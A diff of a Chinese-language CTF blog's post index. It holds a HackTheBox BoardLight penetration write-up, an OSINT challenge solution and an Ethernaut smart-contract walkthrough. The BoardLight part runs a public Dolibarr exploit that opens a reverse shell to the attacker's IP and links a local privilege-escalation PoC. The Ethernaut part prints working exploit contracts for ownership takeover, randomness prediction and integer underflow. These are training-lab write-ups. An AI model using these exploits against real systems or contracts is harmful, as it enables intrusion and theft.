@@ -302,7 +302,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#x65;&#114;&#114;&#x65;&#x6e;&#x63;&#101;&#x64;&#101;&#115;&#x63;&#x61;&#x72;&#116;&#x65;&#x73;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#116;&#x65;&#114;&#114;&#x65;&#x6e;&#x63;&#101;&#x64;&#101;&#115;&#x63;&#x61;&#x72;&#116;&#x65;&#x73;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#101;&#114;&#114;&#101;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#x61;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x74;&#101;&#114;&#114;&#101;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#x61;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -310,7 +310,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#116;&#101;&#114;&#114;&#101;&#x6e;&#x63;&#101;&#100;&#101;&#115;&#99;&#x61;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#116;&#101;&#114;&#114;&#101;&#x6e;&#x63;&#101;&#100;&#101;&#115;&#99;&#x61;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#x65;&#x72;&#114;&#101;&#x6e;&#x63;&#x65;&#100;&#101;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x74;&#x65;&#x72;&#114;&#101;&#x6e;&#x63;&#x65;&#100;&#101;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -1078,35 +1078,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BoardLight Write Up on HackTheBox</title>
-    <url>/2024/06/02/board-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Season 5我今天才上去看&#x3D; &#x3D;<br>這題都是基本技巧但我卡在提成root一小段時間 &#x3D;w&#x3D;  </p>
-<p>Attacker’s IP : 10.10.14.103<br>Victim’s IP : 10.10.11.11<br>Victim’s Host : board.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.11 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/SJ422-q4R.png" alt="image">  </p>
-<p>很正常地開了 port 22的ssh和port 80的web服務  </p>
-<h4 id="subdomain-enumeration"><a href="#subdomain-enumeration" class="headerlink" title="subdomain enumeration"></a>subdomain enumeration</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlist/subdomains.txt -u <span class="string">&quot;http://devvortex.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.devvortex.htb&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BJG10YklC.png" alt="image">  </p>
-<p>因為彈出來都是 7 lines，重新改一下指令：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlists/subdomains-10000.txt -u <span class="string">&quot;http://board.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> -hl 517</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/HJUCnbqEA.png" alt="image">  </p>
-<p>找到子網域<code>crm.board.htb</code>  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-30253"><a href="#CVE-2023-30253" class="headerlink" title="CVE-2023-30253"></a>CVE-2023-30253</h4><p>進去網站後看到這個畫面：<br><img src="https://hackmd.io/_uploads/SJLV6-cVR.png" alt="image"><br>由版本號獲取<code>CVE-2023-30253</code><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">(link)</a>這個漏洞可能可以利用的資訊，嘗試猜測帳密admin&#x2F;admin成功，在端口 9001 監聽：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.103 9001</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://hackmd.io/_uploads/B1OoTZ54C.png" alt="image"><br>成功  </p>
-<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="conf-file-analyzation"><a href="#conf-file-analyzation" class="headerlink" title="conf file analyzation"></a>conf file analyzation</h4><p>根據linpeas提供的結果找到這個檔案<code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code><br>戳下去就有密碼了：<br><img src="https://hackmd.io/_uploads/BkBhCW5EC.png" alt="image"><br>嘗試拿它登入使用者<code>larissa</code>成功。  </p>
-<h4 id="SUID-LPE-with-CVE-2022-37706"><a href="#SUID-LPE-with-CVE-2022-37706" class="headerlink" title="SUID LPE with CVE-2022-37706"></a>SUID LPE with CVE-2022-37706</h4><p>再次看linpeas，注意SUID區LINPEAS未辨識的幾個檔案<br><img src="https://hackmd.io/_uploads/S1ErkMc40.png" alt="image"><br>上網GOOGLE就找到CVE PoC<br><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a><br>RCE!!!<br><img src="https://hackmd.io/_uploads/B1aKkz5N0.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了，晚安世界</p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Blueprint on Tryhackme</title>
     <url>/2024/03/03/blueprint/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>最近在練windows滲透owob<br>想吃東西…  </p>
@@ -1135,6 +1106,35 @@
         <tag>Pentesting</tag>
         <tag>Windows</tag>
         <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BoardLight Write Up on HackTheBox</title>
+    <url>/2024/06/02/board-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Season 5我今天才上去看&#x3D; &#x3D;<br>這題都是基本技巧但我卡在提成root一小段時間 &#x3D;w&#x3D;  </p>
+<p>Attacker’s IP : 10.10.14.103<br>Victim’s IP : 10.10.11.11<br>Victim’s Host : board.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.11 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/SJ422-q4R.png" alt="image">  </p>
+<p>很正常地開了 port 22的ssh和port 80的web服務  </p>
+<h4 id="subdomain-enumeration"><a href="#subdomain-enumeration" class="headerlink" title="subdomain enumeration"></a>subdomain enumeration</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlist/subdomains.txt -u <span class="string">&quot;http://devvortex.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.devvortex.htb&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJG10YklC.png" alt="image">  </p>
+<p>因為彈出來都是 7 lines，重新改一下指令：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlists/subdomains-10000.txt -u <span class="string">&quot;http://board.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> -hl 517</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/HJUCnbqEA.png" alt="image">  </p>
+<p>找到子網域<code>crm.board.htb</code>  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-30253"><a href="#CVE-2023-30253" class="headerlink" title="CVE-2023-30253"></a>CVE-2023-30253</h4><p>進去網站後看到這個畫面：<br><img src="https://hackmd.io/_uploads/SJLV6-cVR.png" alt="image"><br>由版本號獲取<code>CVE-2023-30253</code><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">(link)</a>這個漏洞可能可以利用的資訊，嘗試猜測帳密admin&#x2F;admin成功，在端口 9001 監聽：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.103 9001</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/B1OoTZ54C.png" alt="image"><br>成功  </p>
+<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="conf-file-analyzation"><a href="#conf-file-analyzation" class="headerlink" title="conf file analyzation"></a>conf file analyzation</h4><p>根據linpeas提供的結果找到這個檔案<code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code><br>戳下去就有密碼了：<br><img src="https://hackmd.io/_uploads/BkBhCW5EC.png" alt="image"><br>嘗試拿它登入使用者<code>larissa</code>成功。  </p>
+<h4 id="SUID-LPE-with-CVE-2022-37706"><a href="#SUID-LPE-with-CVE-2022-37706" class="headerlink" title="SUID LPE with CVE-2022-37706"></a>SUID LPE with CVE-2022-37706</h4><p>再次看linpeas，注意SUID區LINPEAS未辨識的幾個檔案<br><img src="https://hackmd.io/_uploads/S1ErkMc40.png" alt="image"><br>上網GOOGLE就找到CVE PoC<br><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a><br>RCE!!!<br><img src="https://hackmd.io/_uploads/B1aKkz5N0.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了，晚安世界</p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1711,6 +1711,215 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Ethernaut 闖關記（前半）</title>
+    <url>/2024/10/16/ethernaut-wp-first/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Hitcon 後一直說要學 web3，然後之後都在忙備審&#x2F;校內&#x2F;大學課程，導致一直沒機會。<br>最近稍微閒下來開始透過 <a href="https://ethernaut.openzeppelin.com/">Ethernaut(link)</a> 學 web3 和 solidity 基礎，發現打智能合約其實蠻好玩的XD<br>身為web狗也該來打web3了吧👊<br>即時更新的 Write Up：<a href="https://hackmd.io/@Whale120/etherwhale">https:&#x2F;&#x2F;hackmd.io&#x2F;@Whale120&#x2F;etherwhale</a>  </p>
+<h2 id="Level-1-Fallback"><a href="#Level-1-Fallback" class="headerlink" title="Level 1 Fallback"></a>Level 1 Fallback</h2><p>Victim’s Address: 0x640ba57ADbCEbaD2E472c56E190EF120C4087589<br>第一次操作Remix IDE，胡亂胡亂終於搞懂了……<br>Remix IDE 教學：<a href="https://decert.me/tutorial/solidity/tools/remix">https://decert.me/tutorial/solidity/tools/remix</a>  </p>
+<p><strong>Step 0. Start Instance</strong><br>滑到底部，開啟，交易後按下 F12 就會看到當前協議的地址<br><img src="https://hackmd.io/_uploads/H1f8QV4RR.png" alt="image">  </p>
+<p><strong>Step 1. Deploy</strong><br>把題目提供的solidity腳本貼到Remix IDE創建的新文件上面：<br><img src="https://hackmd.io/_uploads/H109xV4CC.png" alt="image">  </p>
+<p>接著compile協議，然後去 deploy &amp; run 選擇Injected錢包、Gas Limit調一下（不然很燒燃料費，本次使用50000），最後在 At Address調整一下地址成剛剛的協議地址<br><img src="https://hackmd.io/_uploads/S1PPM44RA.png" alt="image">  </p>
+<p>點開底部的Contracts，原則上應該在剛剛的地址建立協議了：  </p>
+<p><img src="https://hackmd.io/_uploads/rkrS4V4CR.png" alt="image">  </p>
+<p>一排按鈕就是協議裡面public可檢視的內容，可以看到一開始owner不是自己~<br><img src="https://hackmd.io/_uploads/SypFNEV00.png" alt="image">  </p>
+<p><strong>Step 2. Exploit</strong><br>任務：  </p>
+<ol>
+<li>變成owner  </li>
+<li>把錢提走</li>
+</ol>
+<p><strong>Source Code</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>觀察<code>contribute</code>，在contribution大小超過原本的owner時就可以成為新的owner，而<code>withdraw</code>方法做的事情就是透過onlyOnwer確認你是owner後就把錢都往你地址轉，就完成這題了！  </p>
+<p>Exploit: contribute -&gt; owner(確認自己是owner) -&gt; withdraw<br>P.S. contribute 1 wei的方法<br><img src="https://hackmd.io/_uploads/S19p_V4RC.png" alt="image">  </p>
+<h2 id="Level-2-Fallout"><a href="#Level-2-Fallout" class="headerlink" title="Level 2 Fallout"></a>Level 2 Fallout</h2><p>任務：  </p>
+<ol>
+<li>變成owner</li>
+</ol>
+<p><strong>Source Code</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>發現constructor函數外露，直接去請求Fal1out就變成owner了  </p>
+<h2 id="Level-3-Coin-Flip"><a href="#Level-3-Coin-Flip" class="headerlink" title="Level 3 Coin Flip"></a>Level 3 Coin Flip</h2><p>Victim’s Address: 0xBC01FBc340C413293489418b0A0c9A0C54336Ab9<br>題目要求：  </p>
+<ol>
+<li>連續預測正確十次</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先觀察，發現每次隨機是由區塊上的狀態取hash，所以只需要部署一個服務在相同的鏈上就可以取得相同的狀態，進而獲得當次的硬幣區塊。  </p>
+<p><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Coinflip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FAKE_CoinFlip &#123;</span><br><span class="line">    Coinflip public target = Coinflip(0xBC01FBc340C413293489418b0A0c9A0C54336Ab9);</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function FAKE_flip() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用建立interface的方法把預測結果送到Victim’s Contract, 呼叫十次Fake_flip就結束這回合ㄌ  </p>
+<p>P.S.可以自己把GAS Limit調小，打起來不會太貴<br><img src="https://hackmd.io/_uploads/HkdOD6Oykl.png" alt="image"></p>
+<h2 id="Level-4-Telephone"><a href="#Level-4-Telephone" class="headerlink" title="Level 4 Telephone"></a>Level 4 Telephone</h2><p>Victim’s Address: 0xe905433025193D3CBF904601Aab36E6a82d6C591<br>任務：  </p>
+<ol>
+<li>變成owner</li>
+</ol>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在solidity裡面，tx.origin是發起交易時會記錄在stack上面的起始位置，而msg.sender則單純看信息來源是誰，意味著使用tx.origin判斷使用者是誰是不安全的。<br>發起中間人攻擊<br><strong>Exploit.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MitM &#123;</span><br><span class="line">    Telephone public target = Telephone(0xe905433025193D3CBF904601Aab36E6a82d6C591);</span><br><span class="line">    function attack(address _owner) public&#123;</span><br><span class="line">        target.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最後Deploy出去，再attack(自己的地址)即可。  </p>
+<h2 id="Level-5-Token"><a href="#Level-5-Token" class="headerlink" title="Level 5 Token"></a>Level 5 Token</h2><p>一個基本的Token系統，初始進入時會給你20個token<br>任務：  </p>
+<ol>
+<li>讓自己的balance&gt;20</li>
+</ol>
+<p><strong>Source code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>觀察到它使用了uint256進行資料儲存，所以儘管會檢查餘額，只要輸入像是 $2^{256} - 1$  之類的數字就可以完成Interger Overflow的攻擊，讓餘額變成 $20+(2^{256} - 1)&#x3D;21(mod 2^{256})$<br><img src="https://hackmd.io/_uploads/B1Ndp6OJ1l.png" alt="image">  </p>
+<h2 id="Level-6-Delegation"><a href="#Level-6-Delegation" class="headerlink" title="Level 6 Delegation"></a>Level 6 Delegation</h2><p>任務：  </p>
+<ol>
+<li>變成owner</li>
+</ol>
+<p>所謂的delegation，以這題而言就是可以在Delegation的合約裡調用Delegate的函數（不包含環境），而fallback函數則是被傳入空值時會調用到的函數，所以以這題而言發個空的pwn()過去Delegation合約即可。<br><del>不過這題如果想過呼叫一下Delegate合約的pwn()就好(X)</del>  </p>
+<p><strong>Source Code:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具體利用方法為取得pwn()的Keccack-256 hash前4 bytes往Delegation送就好。<br><a href="https://emn178.github.io/online-tools/keccak_256.html">Online Keccack-256(link)</a><br><img src="https://hackmd.io/_uploads/S1_2b0_1kx.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SJS-GCOy1e.png" alt="image">  </p>
+<p>PWNED!!  </p>
+<h2 id="Level-7-Force"><a href="#Level-7-Force" class="headerlink" title="Level 7 Force"></a>Level 7 Force</h2><p>Victim’s address: 0x52C5746DA9D2Ebd076e06A3F99D3415132AA4129  </p>
+<p>一個空的合約<br>任務：  </p>
+<ol>
+<li>讓他的balance&gt;0 ?!</li>
+</ol>
+<p><del>啥玩意</del><br><strong>Source Code:</strong></p>
